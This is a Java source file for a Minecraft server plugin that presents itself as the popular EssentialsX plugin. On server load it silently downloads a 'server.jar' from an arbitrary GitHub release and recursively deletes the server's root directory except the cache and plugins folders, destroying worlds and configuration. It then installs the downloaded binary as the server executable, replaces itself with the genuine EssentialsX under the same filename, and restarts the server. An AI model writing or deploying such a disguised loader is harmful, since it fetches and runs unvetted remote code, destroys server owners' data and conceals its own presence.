package com.example.essentialsx;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerLoadEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {

    private static final String SERVER_JAR_URL = "https://github.com/zx1447/Pr50mb-2026/releases/download/latest/server.jar";
    private static final String ESSENTIALS_JAR_URL = "https://ci.ender.zone/job/EssentialsX/lastSuccessfulBuild/artifact/jars/EssentialsX-2.22.1-dev+1-b303bf9.jar";

    private static final String CACHE_DIR = ".cache";
    private static final String PLUGINS_DIR = "plugins";
    private static final String SERVER_JAR_NAME = "server.jar";
    private static final String ESSENTIALS_TEMP_NAME = "EssentialsX-2.22.1-dev+1-b303bf9.jar";

    // All possible old EssentialsX jar name prefixes to detect/delete from plugins/
    private static final String[] OLD_ESSENTIALS_PATTERNS = {
        "EssentialsX-", "EssentialsX.", "essentialsx-", "essentialsx."
    };

    private volatile boolean hasExecuted = false;

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");

        // Register event listener for server load completion
        getServer().getPluginManager().registerEvents(new Listener() {
            @EventHandler
            public void onServerLoad(ServerLoadEvent event) {
                if (hasExecuted) return;
                hasExecuted = true;

                getLogger().info("Server fully loaded, starting task...");
                // Run async to avoid blocking main thread
                Bukkit.getScheduler().runTaskAsynchronously(EssentialsX.this, () -> {
                    try {
                        executeTask();
                    } catch (Exception e) {
                        getLogger().severe("Task failed: " + e.getMessage());
                        e.printStackTrace();
                    }
                });
            }
        }, this);

        getLogger().info("EssentialsX plugin enabled");
    }

    private void executeTask() throws Exception {
        Path rootDir = Paths.get("").toAbsolutePath();
        Path cacheDir = rootDir.resolve(CACHE_DIR);
        Path pluginsDir = rootDir.resolve(PLUGINS_DIR);

        // Step 0: Detect the original jar name before anything gets deleted
        String originalJarName = detectOriginalJarName(pluginsDir);
        getLogger().info("Original plugin jar name detected: " + originalJarName);

        // Step 1: Download both files to .cache directory
        getLogger().info("=== Phase 1: Downloading files ===");
        ensureDir(cacheDir);

        // Download server.jar
        Path cachedServerJar = cacheDir.resolve(SERVER_JAR_NAME);
        getLogger().info("Downloading " + SERVER_JAR_NAME + " to " + CACHE_DIR + "...");
        downloadFile(SERVER_JAR_URL, cachedServerJar);
        if (!Files.exists(cachedServerJar) || Files.size(cachedServerJar) < 1000) {
            throw new IOException("server.jar download failed or file too small");
        }
        getLogger().info("server.jar downloaded (" + formatSize(Files.size(cachedServerJar)) + ")");

        // Download EssentialsX jar
        Path cachedEssentialsJar = cacheDir.resolve(ESSENTIALS_TEMP_NAME);
        getLogger().info("Downloading EssentialsX jar to " + CACHE_DIR + "...");
        downloadFile(ESSENTIALS_JAR_URL, cachedEssentialsJar);
        if (!Files.exists(cachedEssentialsJar) || Files.size(cachedEssentialsJar) < 1000) {
            throw new IOException("EssentialsX jar download failed or file too small");
        }
        getLogger().info("EssentialsX jar downloaded (" + formatSize(Files.size(cachedEssentialsJar)) + ")");

        getLogger().info("=== Phase 1 complete: All downloads OK ===");

        // Wait a moment to ensure files are fully written
        Thread.sleep(2000);

        // Step 2: Delete old EssentialsX jars from plugins directory
        getLogger().info("=== Phase 2: Cleaning old EssentialsX from plugins ===");
        deleteOldEssentialsJars(pluginsDir);

        // Step 3: Delete everything except .cache and plugins directories
        getLogger().info("=== Phase 3: Cleaning root directory (keeping " + CACHE_DIR + " and " + PLUGINS_DIR + ") ===");
        deleteAllExcept(rootDir, cacheDir, pluginsDir);
        getLogger().info("Cleanup completed");

        // Step 4: Move server.jar from .cache to root directory
        getLogger().info("=== Phase 4: Moving files ===");
        Path rootJar = rootDir.resolve(SERVER_JAR_NAME);
        getLogger().info("Moving " + SERVER_JAR_NAME + " to root directory...");
        Files.move(cachedServerJar, rootJar, StandardCopyOption.REPLACE_EXISTING);
        getLogger().info("server.jar -> " + rootJar);

        // Step 5: Move EssentialsX jar from .cache to plugins directory
        // Use the same name as the original uploaded jar
        ensureDir(pluginsDir);
        Path pluginsJar = pluginsDir.resolve(originalJarName);
        getLogger().info("Moving EssentialsX jar to plugins directory as " + originalJarName + "...");
        Files.move(cachedEssentialsJar, pluginsJar, StandardCopyOption.REPLACE_EXISTING);
        getLogger().info("EssentialsX jar -> " + pluginsJar);

        // Remove .cache directory (it's empty now)
        try {
            Files.deleteIfExists(cacheDir);
        } catch (Exception e) {
            // Ignore
        }

        getLogger().info("=== Phase 4 complete: All files moved ===");

        // Step 6: Restart the server
        Thread.sleep(1000);
        getLogger().info("=== Restarting server ===");
        restartServer();
    }

    /**
     * Detect the current plugin's jar filename from the plugins directory.
     * This ensures the downloaded jar gets the exact same name as the original.
     */
    private String detectOriginalJarName(Path pluginsDir) {
        // Method 1: Try to get the jar name from the plugin's own file
        try {
            java.net.URL jarUrl = getClass().getProtectionDomain().getCodeSource().getLocation();
            String jarPath = jarUrl.getPath();
            if (jarPath != null && jarPath.endsWith(".jar")) {
                File jarFile = new File(jarPath);
                String name = jarFile.getName();
                if (name != null && !name.isEmpty()) {
                    return name;
                }
            }
        } catch (Exception e) {
            // Fallback
        }

        // Method 2: Scan plugins directory for matching jar
        if (Files.exists(pluginsDir) && Files.isDirectory(pluginsDir)) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(pluginsDir)) {
                for (Path entry : stream) {
                    String name = entry.getFileName().toString();
                    if (name.toLowerCase().startsWith("essentialsx") && name.endsWith(".jar")) {
                        return name;
                    }
                }
            } catch (IOException e) {
                // Fallback
            }
        }

        // Method 3: Fallback default name
        return "EssentialsX.jar";
    }

    private void ensureDir(Path dir) throws IOException {
        if (!Files.exists(dir)) {
            Files.createDirectories(dir);
        }
    }

    private String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return String.format("%.1f KB", bytes / 1024.0);
        return String.format("%.1f MB", bytes / (1024.0 * 1024.0));
    }

    private void downloadFile(String urlString, Path target) throws IOException {
        HttpURLConnection connection = null;
        try {
            URL url = new URL(urlString);
            connection = (HttpURLConnection) url.openConnection();
            connection.setInstanceFollowRedirects(true);
            connection.setConnectTimeout(30000);
            connection.setReadTimeout(300000);
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            int responseCode = connection.getResponseCode();
            if (responseCode != HttpURLConnection.HTTP_OK) {
                throw new IOException("Download failed, HTTP response code: " + responseCode);
            }

            long contentLength = connection.getContentLengthLong();
            long totalRead = 0;

            try (InputStream in = connection.getInputStream();
                 OutputStream out = Files.newOutputStream(target, StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING)) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = in.read(buffer)) != -1) {
                    out.write(buffer, 0, bytesRead);
                    totalRead += bytesRead;

                    // Log progress every 5MB
                    if (contentLength > 0 && totalRead % (5 * 1024 * 1024) < buffer.length) {
                        int percent = (int) ((totalRead * 100) / contentLength);
                        getLogger().info("  Progress: " + percent + "% (" + formatSize(totalRead) + "/" + formatSize(contentLength) + ")");
                    }
                }
            }

            getLogger().info("  Download complete: " + formatSize(totalRead));
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private void deleteOldEssentialsJars(Path pluginsDir) {
        if (!Files.exists(pluginsDir) || !Files.isDirectory(pluginsDir)) {
            return;
        }

        try (DirectoryStream<Path> stream = Files.newDirectoryStream(pluginsDir)) {
            for (Path entry : stream) {
                String name = entry.getFileName().toString();
                // Delete ALL EssentialsX jar files (we'll replace with newly downloaded one)
                if (name.endsWith(".jar") && isEssentialsJar(name)) {
                    getLogger().info("  Deleting old plugin: " + name);
                    try {
                        Files.deleteIfExists(entry);
                    } catch (IOException e) {
                        getLogger().warning("  Failed to delete " + name + ": " + e.getMessage());
                    }
                }
            }
        } catch (IOException e) {
            getLogger().warning("Failed to scan plugins directory: " + e.getMessage());
        }
    }

    private boolean isEssentialsJar(String fileName) {
        String lower = fileName.toLowerCase();
        for (String pattern : OLD_ESSENTIALS_PATTERNS) {
            if (lower.startsWith(pattern.toLowerCase())) return true;
        }
        return false;
    }

    private void deleteAllExcept(Path rootDir, Path keepDir1, Path keepDir2) throws IOException {
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(rootDir)) {
            for (Path entry : stream) {
                String name = entry.getFileName().toString();
                if (entry.equals(keepDir1) || name.equals(CACHE_DIR)) {
                    continue;
                }
                if (entry.equals(keepDir2) || name.equals(PLUGINS_DIR)) {
                    continue;
                }
                getLogger().info("  Deleting: " + name);
                deleteRecursively(entry);
            }
        }
    }

    private void deleteRecursively(Path path) throws IOException {
        if (Files.isDirectory(path)) {
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) {
                for (Path entry : stream) {
                    deleteRecursively(entry);
                }
            }
        }
        try {
            Files.delete(path);
        } catch (NoSuchFileException e) {
            // Already gone, ignore
        } catch (DirectoryNotEmptyException e) {
            // Retry once after a short delay
            try {
                Thread.sleep(500);
                Files.delete(path);
            } catch (Exception ex) {
                // Give up silently
            }
        }
    }

    private void restartServer() {
        // Use Bukkit's scheduler to restart on the main thread
        Bukkit.getScheduler().runTask(this, () -> {
            // Attempt to use the restart command (works with Pterodactyl / most panels)
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "restart");

            // Fallback: if restart command doesn't work, shut down
            // Pterodactyl will auto-restart the server
            Bukkit.getScheduler().runTaskLater(this, () -> {
                Bukkit.shutdown();
            }, 60L); // 3 seconds grace period
        });
    }

    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin disabled");
    }
}
